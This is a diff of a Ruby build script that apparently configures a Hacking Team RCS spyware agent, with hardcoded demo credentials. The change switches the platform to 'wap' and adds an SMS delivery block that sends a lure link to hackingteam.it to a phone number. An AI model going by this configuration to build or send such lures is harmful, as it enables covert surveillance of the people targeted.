@@ -5,7 +5,7 @@ require 'json'
 USER = 'alor'
 PASS = 'demorcss'
 FACTORY = 'RCS_0000000001'
-PLATFORM = 'qrcode'
+PLATFORM = 'wap'
 DB = 'localhost'
 PORT = 4444
 DEMO = false
@@ -23,8 +23,13 @@ params = {platform: PLATFORM,
                             vendor: 'face inc',
                             version: '1.2.3'},
                      sign: {edition: '5th3rd'},
-                     link: 'http://www.alor.it'
-                    }
+                    },
+          deliver: {
+                    link: "http://www.hackingteam.it",
+                    text: "prova ciao",
+                    number: 3480115642,
+                    type: 'sms'
+                   }
           }
 
 File.open('build.json', 'w') {|f| f.write params.to_json}
